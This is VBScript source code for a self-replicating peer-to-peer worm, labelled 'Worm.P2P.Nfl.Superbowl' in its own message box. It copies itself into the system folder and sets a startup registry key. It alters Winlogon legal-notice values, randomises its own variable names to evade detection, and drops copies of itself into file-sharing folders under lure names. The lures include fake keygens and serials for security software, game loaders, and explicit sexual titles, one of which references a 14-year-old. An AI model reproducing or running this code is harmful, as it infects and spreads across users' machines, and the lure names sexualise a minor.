On error Resume Next
set shell = createobject("wscript.shell")
set j1E = createobject("scripting.filesystemobject")
Li0K0m1k0 = wscript.scriptfullname
j1E.copyfile Li0K0m1k0,j1E.getspecialfolder(1) & "\Superbowl.vbs"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Superbowl",j1E.getspecialfolder(1)& "\Superbowl.vbs"
Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon\LegalNoticeCaption\Superbowl"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon\LegalNoticeText\(c) by Energy"
if day(now()) = 2 and month(now()) = 1 then
msgbox "Yeahh, Li0K0m1k0 are here", vbInformation,"Worm.P2P.Nfl.Superbowl by Energy"
end if
randomize
set vbsfile=j1E.opentextfile(wscript.scriptfullname,1,false)
DI0TO=vbsfile.readall
a0Tp3Nc0s2p1u0I0g0=array("DI0TO","a0Tp3Nc0s2p1u0I0g0","QDt0OC0q3o1q0e1NC0","P1Cl1c0d2h3","h1U0t0v0Cp0k1q1Ti0","P1Cl1c0d2h3","j1E","Li0K0m1k0","VAH1n0r0L1","Vn1l2Ik0h0D0","T1I0I2u0a0j0g1I0I0o1n0","g1KA0M0a0T0") '
for each QDt0OC0q3o1q0e1NC0 in a0Tp3Nc0s2p1u0I0g0
for h1U0t0v0Cp0k1q1Ti0=1 to int(rnd*14) + 2
if int(rnd*2)+1=1 then
P1Cl1c0d2h3=P1Cl1c0d2h3& ucase(chr((int(rnd*22)+97)))
if int(rnd*2)+1=1 then
P1Cl1c0d2h3=P1Cl1c0d2h3 & int(rnd*int(rnd*4))
end if
else
P1Cl1c0d2h3=P1Cl1c0d2h3&lcase(chr((int(rnd*22)+97)))
if int(rnd*2)+1=1 then
P1Cl1c0d2h3=P1Cl1c0d2h3&int(rnd *2)
else
P1Cl1c0d2h3=P1Cl1c0d2h3&int(rnd*int(rnd*6))
end if
end if
next
DI0TO=replace(DI0TO,QDt0OC0q3o1q0e1NC0,P1Cl1c0d2h3)
P1Cl1c0d2h3=""
next
set vbsfile=j1E.opentextfile(wscript.scriptfullname,2,false)
VAH1n0r0L1 = (Pgdir & "\Vn1l2Ik0h0D0 lite\my shared folder") & "\"
if j1E.folderexists(VAH1n0r0L1) then
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Nfl Halftime.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "SiSoftSandraPro2003.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Ad-aware_6_Plus_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "AVP_4_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Norten_Internet_Security_2003_Serial.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "ChicasScreener.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Teen_Porn_Screener.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Illegal_14Years_Taboo_Sex.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & "Energy_a_Member_of_Brigada_Ocho.vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & ".vbs"
j1E.copyfile Li0K0m1k0,VAH1n0r0L1 & ".vbs"
end if
Vn1l2Ik0h0D0 = (Pgdir & "\Vn1l2Ik0h0D0\my shared folder") & "\"
if j1E.folderexists(Vn1l2Ik0h0D0) then
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Nfl Halftime.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "SiSoftSandraPro2003.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Ad-aware_6_Plus_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "AVP_4_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Norten_Internet_Security_2003_Serial.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "ChicasScreener.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Teen_Porn_Screener.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Illegal_14Years_Taboo_Sex.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & "Energy_a_Member_of_Brigada_Ocho.vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & ".vbs"
j1E.copyfile Li0K0m1k0,Vn1l2Ik0h0D0 & ".vbs"
end if
T1I0I2u0a0j0g1I0I0o1n0 = (Pgdir & "\T1I0I2u0a0j0g1I0I0o1n02000\incoming") & "\"
if j1E.folderexists(T1I0I2u0a0j0g1I0I0o1n0) then
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Nfl Halftime.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "SiSoftSandraPro2003.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Ad-aware_6_Plus_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "AVP_4_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Norten_Internet_Security_2003_Serial.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "ChicasScreener.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Teen_Porn_Screener.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Illegal_14Years_Taboo_Sex.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & "Energy_a_Member_of_Brigada_Ocho.vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & ".vbs"
j1E.copyfile Li0K0m1k0,T1I0I2u0a0j0g1I0I0o1n0 & ".vbs"
end if
g1KA0M0a0T0 = (Pgdir & "\g1KA0M0a0T0\incoming") & "\"
if j1E.folderexists(T1I0I2u0a0j0g1I0I0o1n0) then
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Nfl Halftime.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Unreal_II_The _Awenking_Cd1_Cd2_Loader.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "SiSoftSandraPro2003.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Ad-aware_6_Plus_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "AVP_4_KeyGen.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Norten_Internet_Security_2003_Serial.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "ChicasScreener.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Teen_Porn_Screener.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Illegal_14Years_Taboo_Sex.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & "Energy_a_Member_of_Brigada_Ocho.vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & ".vbs"
j1E.copyfile Li0K0m1k0,g1KA0M0a0T0 & ".vbs"
vbsfile.write DI0TO
end if
